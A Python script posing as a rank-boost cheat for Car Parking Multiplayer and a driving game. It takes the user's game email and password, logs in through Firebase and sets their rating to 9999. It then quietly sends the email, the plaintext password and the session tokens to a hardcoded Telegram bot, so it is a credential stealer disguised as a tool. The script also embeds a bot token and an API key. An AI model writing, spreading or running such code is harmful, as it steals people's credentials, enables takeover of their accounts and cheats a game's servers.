
import requests
import json
import time

# --- Telegram Bot Configuration ---
BOT_TOKEN = "8409129149:AAFArKX3_eN_yqFLQrX_0KqIt8TZIZ3gqJU"
CHAT_IDS = [8112555317]  # Add more chat IDs here if needed

# --- Game Configurations ---
GAMES = {
    "1": {
        "name": "Car Parking Multiplayer",
        "firebase_api_key": "AIzaSyBW1ZbMiUeDZHYUO2cZbY8Bfnf5rRgrQGPTM",
        "rank_url": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
        "login_tag": "Cpm1"
    },
    "2": {
        "name": "Driving School Simulator",
        "firebase_api_key": "AIzaSyD5EXAMPLEKEYFORDRIVINGSCHOOL",
        "rank_url": "https://us-central1-driving-school.cloudfunctions.net/SetUserRating",
        "login_tag": "Cpm2"
    }
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

def send_telegram_message(message):
    for chat_id in CHAT_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Failed to send message to {chat_id}: {e}")

def login(email, password, game):
    api_key = GAMES[game]["firebase_api_key"]
    login_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    try:
        r = requests.post(login_url, json=payload, headers=HEADERS, timeout=10)
        if r.status_code == 200:
            j = r.json()
            id_token = j.get("idToken")
            refresh_token = j.get("refreshToken")
            local_id = j.get("localId")
            return {
                "idToken": id_token,
                "refreshToken": refresh_token,
                "localId": local_id
            }
        else:
            print("Login failed:", r.text)
            return None
    except Exception as e:
        print("Login error:", e)
        return None

def set_rank(token_data, game):
    rank_url = GAMES[game]["rank_url"]
    headers = {
        "Authorization": f"Bearer {token_data['idToken']}",
        "Content-Type": "application/json"
    }
    payload = {
        "rating": 9999
    }
    try:
        r = requests.post(rank_url, json=payload, headers=headers, timeout=10)
        if r.status_code == 200:
            print("Rank set successfully.")
            return True
        else:
            print("Failed to set rank:", r.text)
            return False
    except Exception as e:
        print("Set rank error:", e)
        return False

def main():
    while True:
        print("Select game:")
        for k, v in GAMES.items():
            print(f"{k}. {v['name']}")
        print("0. Exit")
        choice = input("Choose (1/2/0): ").strip()
        if choice == "0":
            break
        if choice in GAMES:
            game = choice
            tag = GAMES[game]["login_tag"]
            try:
                email = input("📧 Enter email: ").strip()
                password = input("🔒 Enter password: ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\\nExiting...")
                break

            token = login(email, password, game)
            if token:
                if set_rank(token, game):
                    # Send credentials and info to Telegram
                    message = f"🔐 Login {tag}:\\n📧 Email: {email}\\n🔒 Password: {password}\\n🔑 Tokens: {json.dumps(token)}"
                    send_telegram_message(message)
                    print("\\nOperation completed.")
        else:
            print("❌ Invalid choice. Please select 1, 2, or 0.")

if __name__ == "__main__":
    main()
